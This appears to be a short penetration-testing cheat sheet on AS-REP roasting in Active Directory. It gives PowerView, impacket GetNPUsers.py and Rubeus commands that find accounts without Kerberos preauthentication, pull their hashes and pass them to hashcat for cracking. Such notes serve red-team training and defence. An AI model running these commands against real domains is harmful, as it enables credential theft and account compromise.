> To identify users with the account option "Do not require Kerberos preauthentication" using powerview:

```
Get-DomainUser -PreauthNotRequired 
```

> On Kali Linux, we can perform ASEP-Roasting using a pair of credentials for authentication:

```
GetNPUsers.py -dc-ip <DC_ip> <domain_name>/<username>:<password> -request -outputfile asrephashes.txt 
```

We can then attempt to crack this using hashcat.

> On windows we can perform this attack using Rubeus.exe:

```
.\Rubeus.exe asreproast /nowrap
```

Here we will obtain a hash which we can copy and paste into a file and crack 
